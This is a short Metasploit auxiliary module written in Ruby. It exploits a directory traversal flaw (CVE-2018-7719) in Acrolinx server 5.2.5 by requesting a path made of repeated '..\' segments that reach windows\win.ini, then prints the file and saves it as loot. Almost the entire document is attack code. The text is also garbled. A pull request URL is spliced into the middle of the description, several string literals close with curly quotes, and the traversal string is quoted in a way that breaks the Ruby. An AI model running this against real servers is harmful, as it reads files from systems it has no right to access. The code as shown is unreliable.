##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Acrolinx Server Directory Traversal',
      'Description'    => %q{
        Acrolinx server 5.2.5 version is affected by directory https://github.com/rapid7/metasploit-framework/pull/11072traversal vulnerability
      },
      'Author'         =>
        [
          'Berk Dusunur', # Security Researcher
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2018-7719’],
          ['URL', 'https://www.berkdusunur.net/2018/03/tr-en-acrolinx-dashboard-directory.html'],
          ['EDB', '44345’]
        ]
    ))

    register_options(
    [
      OptString.new('TARGETURI', [true,'path to directory traversel to', '..\' * 6 + 'windows\win.ini'])
    ])

  end

  def run
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    })

    if res && res.code == 200
      print_status(res.body)
      path = store_loot('httpdasm.file', 'application/octet-stream', rhost, res.body)
    else
      if res
        print_error("Unexpected response from server: #{res.code}")
      else
        print_error("No Response")
      end
    end
  end
end
